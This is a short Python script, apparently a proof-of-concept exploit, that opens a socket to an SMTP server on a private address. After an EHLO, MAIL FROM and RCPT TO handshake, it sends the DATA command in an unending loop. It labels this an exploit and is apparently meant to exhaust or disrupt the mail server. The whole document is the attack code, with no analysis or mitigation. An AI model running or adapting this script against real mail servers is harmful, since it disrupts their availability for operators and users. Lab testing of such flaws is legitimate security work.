import socket
import time

# Target SMTP server and port
server = "10.0.0.251"
port = 25

# Function to establish a connection
def connect_to_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server, port))
    print("Connected to the SMTP server.")
    return sock

# Function to send commands 
def send_only(sock, command):
    try:
        sock.send(command.encode())
        print(f"Sent: {command.strip()}")
    except Exception as e:
        print(f"Error while sending: {e}")

sock = connect_to_server()

# initial handshake
send_only(sock, "EHLO localhost\r\n")
send_only(sock, "MAIL FROM:<sender@example.com>\r\n")
send_only(sock, "RCPT TO:<recipient@example.com>\r\n")

print("Starting exploit: Sending Data")
try:
    while True:
        # Send repeated DATA commands 
        send_only(sock, "DATA\r\n")
        time.sleep(0.1)  # Short delay to avoid overwhelming the server
except KeyboardInterrupt:
    print("\nExploit interrupted by user.")
finally:
    sock.close()
    print("Connection closed.")
